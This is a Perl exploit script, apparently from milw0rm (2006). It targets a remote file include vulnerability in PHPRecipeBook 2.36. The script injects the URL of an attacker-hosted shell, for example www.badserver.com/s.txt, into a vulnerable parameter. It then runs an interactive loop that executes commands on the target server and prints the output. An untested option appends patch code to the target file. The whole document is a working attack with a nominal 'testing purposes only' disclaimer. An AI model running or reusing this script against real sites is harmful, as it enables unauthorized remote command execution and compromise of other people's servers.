@@ -1,0 +1,118 @@
+#!/usr/bin/perl
+
+#####################################################################################################
+#                                                                                                   #
+# PHPRecipeBook 2.36                                                                                #
+#                                                                                                   #
+# Class:  Remote File Include Vulnerability                                                         #
+#                                                                                                   #
+# Date:   2006/10/16                                                                                #
+#                                                                                                   #
+# Remote: Yes                                                                                       #
+#                                                                                                   #
+# Type:   Highly critical                                                                           #
+#                                                                                                   #
+# Vendor: http://phprecipebook.sourceforge.net/                                                     #
+#                                                                                                   #
+# Download: http://sourceforge.net/project/showfiles.php?group_id=65127                             #
+#                                                                                                   #
+# Note: Successful exploitation requires register_globals = on and magic_quotes_gpc = on            #
+#                                                                                                   #
+# Discovered & Exploit by: r0ut3r ( writ3r@gmail.com)                                               #
+#                                                                                                   #
+# Exploit: recipe2.36_xpl.pl                                                                        #
+#                                                                                                   #
+#####################################################################################################
+
+use LWP::UserAgent;
+use LWP::Simple;
+
+$target = @ARGV[0];
+$shellsite = @ARGV[1];
+$shellcmd = @ARGV[2];
+$file = "/classes/Import_MM.class.php?g_rb_basedir=";
+
+if(!$target || !$shellsite)
+{
+    usage();
+}
+
+header();
+
+print "Type 'exit' to quit";
+print "[cmd]\$";
+$cmd = <STDIN>;
+
+while ($cmd !~ "exit")
+{
+    $xpl = LWP::UserAgent->new() or die;
+        $req =
+HTTP::Request->new(GET=>$target.$file.$shellsite.'?&'.$shellcmd.'='.$cmd)
+or die("\n\n Failed to connect.");
+        $res = $xpl->request($req);
+        $r = $res->content;
+        $r =~ tr/[\n]/[&#234;]/;
+
+    if (@ARGV[4] eq "-r")
+    {
+        print $r;
+    }
+    elsif (@ARGV[5] eq "-p")
+    {
+    # if not working change cmd variable to null and apply patch manually.
+    $cmd = "echo if(basename(__FILE__) == basename(\$_SERVER['PHP_SELF'])) die(); >> Import_MM.class.php";
+    print q
+    {
+########################################################################
+                 Patch Applied
+Code added to Import_MM.class.php:
+if(basename(__FILE__) == basename($_SERVER['PHP_SELF']))
+    die();
+
+NOTE: Adding patch function has not been tested. If does not complie or
+there is an error, simply make cmd = null and add the patch code to
+Import_MM.class.php
+########################################################################
+    }
+    }
+    else
+    {
+    print "[cmd]\$";
+    $cmd = <STDIN>;
+    }
+}
+
+sub header()
+{
+    print q
+    {
+########################################################################
+           PHPRecipeBook 2.36 - Remote File Include Exploit
+            Vulnerability discovered and exploit by r0ut3r
+                          writ3r@gmail.com
+            For recipe administrator testing purposes only!
+########################################################################
+    };
+}
+
+sub usage()
+{
+header();
+    print q
+    {
+########################################################################
+Usage:
+perl recipe2.36_xpl.pl <Target website> <Shell Location> <CMD Variable> <-r> <-p>
+<Target Website> - Path to target eg: www.recipevuln.target.com
+<Shell Location> - Path to shell eg: www.badserver.com/s.txt
+<CMD Variable> - Shell command variable name eg: cmd
+<r> - Show output from shell
+<p> - Patch Import_MM.class.php
+Example:
+perl a.pl http://localhost http://localhost/s.txt cmd -r -p
+########################################################################
+    };
+exit();
+}
+
+# milw0rm.com [2006-10-17]
